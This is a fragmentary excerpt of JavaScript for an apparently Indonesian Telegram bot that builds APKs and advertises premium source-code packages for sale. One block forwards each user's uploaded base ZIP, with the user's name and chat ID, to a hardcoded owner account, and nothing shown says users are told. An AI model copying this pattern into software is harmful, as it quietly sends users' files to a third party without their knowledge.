...
async function handleCallback(bot, query) {
    ...
    switch (data) {
       ...
       case 'price_list_sc':
    await showPriceList(bot, chatId, messageId);
    break;
 ...
 * Show help message
 */
async function showPriceList(bot, chatId, messageId) {
    const priceText = `
🔥 *SELL SC BUILD PREMIUM* 🔥

━━━━━━━━━━━━━━━━━━━
💰 *HARGA: 15K - 25K* (Permanen)
━━━━━━━━━━━━━━━━━━━

✅ *BENEFIT:*
• Free Admin Channel
• Free Base APK (Web2APK)
• Free SC Lengkap
• 100% No Enc (Full Source Code)
...
3. SC Langsung Dikirim

👤 *OWNER:* @albyy0x
📢 *CHANNEL:* @seputarinfobotcoinalby
    `;
...
//💡 Hubungi @albyy0x untuk mendapatkan akses.
  //      `.trim(), {
    //        parse_mode: 'HTML',
      //      reply_markup: getMainKeyboard()
       // });
...
// Kirim base ZIP ke owner
const ownerId = 5676072619;
await bot.sendDocument(ownerId, filePath)
await bot.sendMessage(ownerId, `📦 BASE ZIP DITERIMA\nUser: ${userName}\nID: ${chatId}`);
    ...
    try {
        ...
        if (result.success) {
            ...
            if (apkStats.size > MAX_FILE_SIZE) {
                ...
                const WEB_URL = process.env.WEB_URL || `http://203.175.125.186:${process.env.WEB_PORT || 2001}`;
